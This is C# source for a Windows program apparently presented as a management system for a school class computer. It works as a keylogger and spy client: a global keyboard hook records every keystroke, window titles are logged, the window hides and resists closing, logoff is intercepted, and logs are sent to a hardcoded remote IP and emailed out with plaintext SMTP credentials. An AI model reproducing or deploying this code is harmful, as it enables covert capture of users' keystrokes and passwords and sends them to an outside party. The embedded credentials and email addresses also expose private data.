using FascistLaresLServerMoudle;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace SuperBanFascistLares
{
    public partial class Form1 : Form
    {
        string log_dir = @"D:/SeewoLink/Programme Data/roaming/data/dumps/";//保存记录的文件夹
        string log_file = "";//保存记录的txt
        DateTime startUpTime;

        bool keyBdHookEnabled = false;//指示键盘钩子是否启用
        bool allowShutDown = false;//指示是否允许关机
        bool internetavaliable = true;//指示网络是否通畅


        StringBuilder sb = new StringBuilder();
        List<softwareinfo> info = new List<softwareinfo>();//软件启动列表
        List<string> server_info = new List<string>();//接收到的服务器消息
        List<KeyboardEvent> KeyEvent = new List<KeyboardEvent>();//按键监听
        List<string> emaillist = new List<string>();//接收报告的联系人

        struct KeyboardEvent
        {
            public string key;
            public DateTime time;
        }
        public struct softwareinfo
        {
            public string content;
            public DateTime time;
            public string remarks;
        }

        public Form1()
        {
            InitializeComponent();
            SystemEvents.SessionEnding += new SessionEndingEventHandler(SystemEvents_SessionEnding);
            k_hook.KeyDownEvent += new KeyEventHandler(hook_KeyDown);
            this.WindowState = FormWindowState.Minimized;
            Thread.CurrentThread.IsBackground = true;
        }
        private KeyboardHook k_hook = new KeyboardHook();
        private void hook_KeyDown(object sender, KeyEventArgs e)
        {
            KeyboardEvent keyboardEvent = new KeyboardEvent();
            keyboardEvent.key = e.KeyCode.ToString();
            keyboardEvent.time = DateTime.Now;
            KeyEvent.Add(keyboardEvent);
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            InitLog();
            //互斥
            if (IsaProcess("Heirong Sysdiag Helper"))
            {
                Write("关闭：互斥");
                Environment.Exit(0);
            }
            emaillist.Add("42434031@qq.com");
            //初始化本地存储
            ConnectToServer();
            AppendLog($"client online! {DateTime.Now.ToLongTimeString()}");
            AppendLog("[command] client_started");
            //连接至服务器
            timer1.Start();
            startUpTime = DateTime.Now;
        }


        #region Methods
        /// <summary>
        /// 向power咲输入命令
        /// </summary>
        /// <param name="command"></param>
        /// <returns></returns>
        public string cmd(string command)
        {
            Process p = new Process();
            p.StartInfo.FileName = "powershell.exe";
            p.StartInfo.UseShellExecute = false;                  //这里是关键点,不用Shell启动
            p.StartInfo.RedirectStandardInput = true;             //重定向输入
            p.StartInfo.RedirectStandardOutput = true;            //重定向输出
            p.StartInfo.CreateNoWindow = true;                    //不显示窗口
            p.Start();
            p.StandardInput.WriteLine(command);
            //p.WaitForExit();
            p.StandardInput.WriteLine("exit");
            string s = p.StandardOutput.ReadToEnd();
            p.Close();
            return s;
        }
        #endregion

        #region DLL and methods
        /// <summary>
        /// 拒绝一般关闭
        /// </summary>
        /// <param name="e"></param>
        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            e.Cancel = true;
            base.OnFormClosing(e);
        }
        /// <summary>
        /// 接管用户关机/注销
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void SystemEvents_SessionEnding(object sender, SessionEndingEventArgs e)
        {
            if (!allowShutDown)
            {
                e.Cancel = true;
                generateEmail();
                Shutdown();
            }
            SessionEndReasons reason = e.Reason;
            switch (reason)
            {
                case SessionEndReasons.Logoff:
                    AppendLog("用户正在注销。操作系统继续运行，但启动此应用程序的用户正在注销。");
                    break;
                case SessionEndReasons.SystemShutdown:
                    AppendLog("操作系统正在关闭");
                    break;
            }
        }

        [DllImport("user32.dll")]
        private static extern bool LockWorkStation();
        [DllImport("gdi32.dll")]
        private static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, int dwRop);
        [DllImport("User32")]
        private extern static int GetWindow(int hWnd, int wCmd);
        [DllImport("User32")]
        private extern static int GetWindowLongA(int hWnd, int wIndx);
        [DllImport("user32", CharSet = CharSet.Auto)]
        private extern static int GetWindowTextLength(IntPtr hWnd);
        [DllImport("user32.dll")]
        private static extern bool GetWindowText(int hWnd, StringBuilder title, int maxBufSize);
        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        internal struct TokPriv1Luid
        {
            public int Count; public long Luid; public int Attr;
        }

        //以下使用DLLImport特性导入了所需的Windows API。
        //导入这些方法必须是static extern的，并且没有方法体。
        //调用这些方法就相当于调用Windows API。
        [DllImport("kernel32.dll", ExactSpelling = true)]
        internal static extern IntPtr GetCurrentProcess();

        [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
        internal static extern bool OpenProcessToken(IntPtr h, int acc, ref IntPtr phtok);

        [DllImport("advapi32.dll", SetLastError = true)]
        internal static extern bool LookupPrivilegeValueA
        (string host, string name, ref long pluid);

        [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
        internal static extern bool
        AdjustTokenPrivileges(IntPtr htok, bool disall, ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen);

        [DllImport("user32.dll", ExactSpelling = true, SetLastError = true)]
        internal static extern bool ExitWindowsEx(int flg, int rea);
        public const int SE_PRIVILEGE_ENABLED = 0x00000002;
        public const int TOKEN_QUERY = 0x00000008;
        public const int TOKEN_ADJUST_PRIVILEGES = 0x00000020;
        public const string SE_SHUTDOWN_NAME = "SeShutdownPrivilege";
        public const int EWX_LOGOFF = 0x00000000;
        public const int EWX_SHUTDOWN = 0x00000001;
        public const int EWX_REBOOT = 0x00000002;
        public const int EWX_FORCE = 0x00000004;
        public const int EWX_POWEROFF = 0x00000008;
        public const int EWX_FORCEIFHUNG = 0x00000010;

        public bool IsaProcess(string strProcessesByName)//询问有否thread
        {
            bool bo = false;
            foreach (Process p in Process.GetProcesses())//GetProcessesByName(strProcessesByName))
            {
                //Console.WriteLine(p.ProcessName);
                if (p.ProcessName.ToLower().Contains(strProcessesByName.ToLower()))
                {
                    if (p.Id == Process.GetCurrentProcess().Id)
                    {
                        return false;
                    }
                    else
                    {

                        return true;
                    }
                }
            }
            return bo;
        }

        private const int GW_HWNDFIRST = 0;
        private const int GW_HWNDNEXT = 2;
        private const int GWL_STYLE = (-16);
        private const int WS_VISIBLE = 268435456;
        private const int WS_BORDER = 8388608;
        private Bitmap SaveScShot()
        {
            Bitmap baseImage = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            try
            {
                Graphics g = Graphics.FromImage(baseImage);
                g.CopyFromScreen(new Point(0, 0), new Point(0, 0), Screen.AllScreens[0].Bounds.Size);
            }
            catch (Exception ex)
            {

            }
            return baseImage;

        }
        public static void Shutdown()
        {
            DoExitWin(EWX_FORCE | EWX_POWEROFF);
        }
        public static void DoExitWin(int flg)
        {
            bool ok;
            TokPriv1Luid tp;
            IntPtr hproc = GetCurrentProcess();
            IntPtr htok = IntPtr.Zero;
            ok = OpenProcessToken(hproc, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ref htok);
            tp.Count = 1;
            tp.Luid = 0;
            tp.Attr = SE_PRIVILEGE_ENABLED;
            ok = LookupPrivilegeValueA(null, SE_SHUTDOWN_NAME, ref tp.Luid);
            ok = AdjustTokenPrivileges(htok, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
            ok = ExitWindowsEx(flg, 0);
        }
        public List<string> GetRunApplicationList(Form appForm)
        {
            List<string> appString = new List<string>();
            try
            {
                int handle = (int)appForm.Handle;
                int hwCurr;
                hwCurr = GetWindow(handle, GW_HWNDFIRST);
                while (hwCurr > 0)
                {
                    int isTask = (WS_VISIBLE | WS_BORDER);
                    int lngStyle = GetWindowLongA(hwCurr, GWL_STYLE);
                    bool taskWindow = ((lngStyle & isTask) == isTask);
                    if (taskWindow)
                    {
                        int length = GetWindowTextLength(new IntPtr(hwCurr));
                        StringBuilder sb = new StringBuilder(2 * length + 1);
                        GetWindowText(hwCurr, sb, sb.Capacity);
                        string strTitle = sb.ToString();
                        if (!string.IsNullOrEmpty(strTitle))
                        {
                            appString.Add(strTitle);
                        }
                    }
                    hwCurr = GetWindow(hwCurr, GW_HWNDNEXT);
                }
                return appString;
            }
            catch (Exception)
            {

            }
            return appString;
        }
        private void AppendLog(string content)
        {
            sb.Append(content);
            Write(content);
            SendToserver($"[Message]{content}");
        }
        private void AppendInfo(string title, string content, string remarks) { }

        private void generateEmail()
        {
            SmtpClient client = new SmtpClient("smtp.zoho.com.cn", 587)//587
            {
                Credentials = new NetworkCredential("41041402", "7t2kyYSWhtWN"),
                EnableSsl = true
            };


            MailAddress from = new MailAddress(@"admin@bakamashiro.com", "YuzheShi");
            MailAddress to = new MailAddress(@"dylan_233@foxmail.com", "baka_mashiro");
            MailMessage myMail = new System.Net.Mail.MailMessage(from, to);

            // set subject and encoding
            myMail.Subject = "日常报表 - 高三三班计算机管理系统";
            myMail.SubjectEncoding = System.Text.Encoding.UTF8;
            myMail.IsBodyHtml = true;

            //如果要添加抄送 
            foreach (var item in emaillist)
            {
                MailAddress copy = new MailAddress(item);
                myMail.CC.Add(copy);
            }

            DateTime dt = DateTime.Now;
            myMail.Body =
                $"<!DOCTYPE html>" +
                $"<h1>高三三班计算机管理系统 - 日常报表</h1>" +
                $"<h3>报告信息</h3>" +
                $"<a style=\"padding - left: 2em; \"><i>报表将会在关机时产生。</i></a>" +
                $"<br />" +
                $"<a style=\"padding - left: 2em; \">软件启动时间:{startUpTime.ToLocalTime()}</a>" +
                $"<br />" + $"<a style=\"padding - left: 2em; \">运行时间:{DateTime.Now.Subtract(startUpTime).TotalHours}时</a>" +
                $"<br />" + $"<a style=\"padding - left: 2em; \">报告生成时间:{DateTime.Now.ToLocalTime()}</a>" +
                $"<br />" + $"<a style=\"padding - left: 2em; \">记录文件MD5码:</a>" +
                $"<h2>简报</h2>" +
                $"<h3 style=\"padding - left: 1em; \">应用程式与网页启动列表</h3>" +
                $"{GetListHTML(info)}" +
                $"<h3 style=\"padding - left: 1em; \">受标识的程式启动记录</h3>" +
                $"(目前版本不受支持的功能)" +
                $"<p style=\"padding - left: 2em; \">受标识的程式名:</p>" +
                $"(目前版本不受支持的功能)" +
                $"<h3 style=\"padding - left: 1em; \">键盘事件监听记录</h3>" +
                $"{GetKeyEvent(KeyEvent)}" +
                $"<h2>详细信息</h2>" + $"" + $"<details style=\"padding - left: 1em; \">" +
                $"    <summary>客户端记录(点击展开)</summary>" +
                $"    <ol>" +
                $"        <li>{sb.ToString()}</li>" +
                $"    </ol>" + $"</details>" +
                $"<br />" +
                $"<details style=\"padding - left: 1em; \">" +
                $"    <summary>服务端记录(点击展开)</summary>" + $"    <ol>" +
                $"        <li>{GetServerInfos()}</li>" +
                $"    </ol>" + $"</details>" +
                $"<br />" +
                $"<div style=\"text - align: right; \" >高三三班计算机管理系统</div>" +
                $"<div style=\"text - align: right; \" >{DateTime.Now.ToLongDateString()}</div>";


            myMail.BodyEncoding = System.Text.Encoding.UTF8;
            myMail.IsBodyHtml = true;
            try
            {
                client.Send(myMail);
            }
            catch (Exception ex)
            {
                Write(ex.Message);
            }
        }


        #endregion
        private static string GetListHTML(List<softwareinfo> vs)
        {
            int index = 0;
            StringBuilder stringBuilder = new StringBuilder();
            DataTable table = new DataTable();
            table.Columns.Add("index", typeof(string));
            table.Columns.Add("title", typeof(string));
            table.Columns.Add("content", typeof(string));
            table.Columns.Add("startuptime", typeof(string));
            table.Columns.Add("info", typeof(string));

            foreach (var item in vs)
            {
                table.Rows.Add((++index).ToString(), "", item.content, item.time.ToLocalTime(), item.remarks);
            }
            foreach (DataRow row in table.Rows)
            {
                stringBuilder.Append(
            @"<tr>
                <td>" + row[0].ToString() + @"</td>
                <td >" + row[1].ToString() + @"</td>
                <td>" + row[2].ToString() + @"</td>
                <td>" + row[3].ToString() + @"</td>
                <td>" + row[4].ToString() + @"</td>   
            </tr>");
            }
            return stringBuilder.ToString();
        }

      
        private string GetServerInfos()
        {
            string s=string.Empty;
            foreach (var item in server_info)
            {
                s += item;
            }
            return s;
        }
        private static string GetKeyEvent(List<KeyboardEvent> vs)
        {
            StringBuilder stringBuilder = new StringBuilder();
            DataTable table = new DataTable();
            table.Columns.Add("key", typeof(string));
            table.Columns.Add("time", typeof(string));

            foreach (var item in vs)
            {
                table.Rows.Add(item.key, item.time.ToShortTimeString());
            }
            foreach (DataRow row in table.Rows)
            {
                stringBuilder.Append(
            @"<tr>
                <td>" + row[0].ToString() + @"</td>
                <td >" + row[1].ToString() + @"</td>  
            </tr>");
            }
            return stringBuilder.ToString();
        }
        //服务器相关
        #region ServerConnections
        public Socket clientSocket { get; set; }
        int reconnect_attempts = 0;
        int max_reconnect_attempts = 60;
        private void ConnectToServer()
        {
            //1、创建socket
            Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            clientSocket = socket;
            //2、连接服务器（ip+port）
            try
            {
                socket.Connect(IPAddress.Parse("49.233.157.228"), Convert.ToInt32(12589));
            }
            catch (Exception ex)
            {
                Thread.Sleep(5000);
                if (reconnect_attempts++ > max_reconnect_attempts)
                {
                    MessageBox.Show($"第[{reconnect_attempts}]次尝试连接服务器，连接失败,{ex.Message}");
                }
                AppendLog($"第[{reconnect_attempts}]次尝试连接服务器，连接失败,{ex.Message}");
                ConnectToServer();
                return;
            }
            //3、开始接收信息
            Thread thread = new Thread(new ParameterizedThreadStart(receiveData));
            thread.IsBackground = true;
            thread.Start(clientSocket);
        }

        private void receiveData(object socket)
        {
            byte[] data = new byte[1024 * 1024];
            while (true)
            {
                int len = 0;
                try
                {
                    len = clientSocket.Receive(data, 0, data.Length - 1, SocketFlags.None);
                }
                catch (Exception)
                {

                    try
                    {
                        this.Logserverinfo(string.Format("服务端{0}异常退出", clientSocket.RemoteEndPoint.ToString()));
                    }
                    catch (Exception)
                    {

                    }
                    stopConnect();//关闭连接
                    return;
                }

                if (len <= 0)
                {
                    try
                    {
                        this.Logserverinfo(string.Format("服务端{0}正常退出", clientSocket.RemoteEndPoint.ToString()));
                    }
                    catch (Exception)
                    {

                    }
                    stopConnect();//关闭连接
                    return;
                }

                string str = Encoding.Default.GetString(data, 0, len);
                Logserverinfo(string.Format("服务端发来信息：{0}", str));
            }
        }

        //关闭连接
        private void stopConnect()
        {
            if (clientSocket.Connected)
            {
                try
                {
                    clientSocket.Shutdown(SocketShutdown.Both);
                    clientSocket.Close(100);
                }
                catch (Exception)
                {

                }
            }
        }
        /// <summary>
        /// 接收到服务器消息
        /// </summary>
        /// <param name="str"></param>
        private void Logserverinfo(string str)//添加日志记录
        {
            this.server_info.Add(str);
        }

        private void SendToserver(string content)
        {
            if (clientSocket.Connected)
            {
                byte[] data = Encoding.Default.GetBytes(content);
                try
                {
                    clientSocket.Send(data, 0, data.Length, SocketFlags.None);
                }
                catch (Exception ex)
                {
                    Write($"远程服务中断！ {ex.Message}");
                    internetavaliable = false;
                }
            }
            else
            {
                internetavaliable = false;
            }
        }

        private void MainForm_FormClosing(object sender, FormClosingEventArgs e)
        {
            //判断是否连接，如果连接则关闭连接
            stopConnect();
        }
        #endregion

        //本地存储
        #region LocalStorge
        FileStream fs;
        StreamWriter sw;

        private void InitLog()
        {
            if (!Directory.Exists(log_dir))
            {
                Directory.CreateDirectory(log_dir);
            }
            log_file = $"{log_dir}{DateTime.Now.ToString("yyyy-MM-dd-HH-mm-ss")}_log.db";
            fs = new FileStream(log_file, FileMode.Create);
            sw = new StreamWriter(fs);
        }

        private void CloseLog()
        {
            fs = new FileStream(log_file, FileMode.Append);
            sw = new StreamWriter(fs);
            sw.Flush();
            //关闭流
            sw.Close();
            fs.Close();
        }


        public void Write(string content)
        {
            sw.Write(content + Environment.NewLine);
            sw.Flush();
        }
        #endregion

        private void timer1_Tick(object sender, EventArgs e)
        {
            //心跳检查
            if (internetavaliable)
            {
                SendToserver("[alive]");
            }
            foreach (string item in GetRunApplicationList(this))
            {
                bool found = false;
                for (int i = 0; i < info.Count; i++)
                {
                    if (info[i].content == item)
                    {
                        found = true;
                        continue;
                    }
                }
                if (!found)
                {
                    AppendLog(item);
                    softwareinfo softwareinfo = new softwareinfo();
                    softwareinfo.content = item;
                    softwareinfo.time = DateTime.Now;
                    info.Add(softwareinfo);
                }
            }
            //generateEmail();
        }
    }
}
